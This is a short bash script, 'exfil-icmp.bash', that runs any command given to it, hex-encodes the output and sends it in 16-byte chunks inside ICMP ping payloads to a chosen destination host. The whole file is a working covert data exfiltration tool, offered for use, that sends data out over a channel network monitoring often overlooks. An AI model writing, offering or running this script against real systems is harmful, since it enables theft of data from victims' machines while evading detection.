#!/usr/bin/env bash

# Make sure the user specified a destination and a command
if [[ -z "$1" ]] || [[ -z "$2" ]];
then
    echo "usage: exfil-icmp.bash <destination> <command>"
    exit 1
fi

DEST=$1                            # SET DEST TO THE FIRST ARG
CMD=${@:2}                         # SET CMD TO THE REST OF THE ARGS
OUTPUT=$($CMD | xxd -p -c 16)      # RUN THE COMMAND AND COVERT TO HEX, 16 BYTES PER LINE

ORG=$IFS                           # STORE THE ORIGINAL FIELD SEP
IFS=$(echo -en "\n\b")             # SET THE FIELD SEP

for ROW in ${OUTPUT[@]}            # LOOP THROUGH THE LINES OF OUTPUT
do
    if [[ ${#ROW} = 32 ]]; then    # IF THE LINE IS A FULL 16 BYTES SET AS PAYLOAD
        PAYLOAD=$ROW
    else                           # OTHERWISE PAD THE RIGHT SIDE WITH NULLS
        PAD=$(printf "%0$(expr 32 - ${#ROW})d" 0)
        PAYLOAD=$ROW$PAD
    fi
    
    # SEND THE PAYLOAD IN THE PING AND SWALLOW THE RESPONSE FROM PING
    RESPONSE=$(ping -c 1 -p $PAYLOAD $DEST)
done

IFS=$ORG                           # RESTORE THE ORIGINAL FIELD SEP
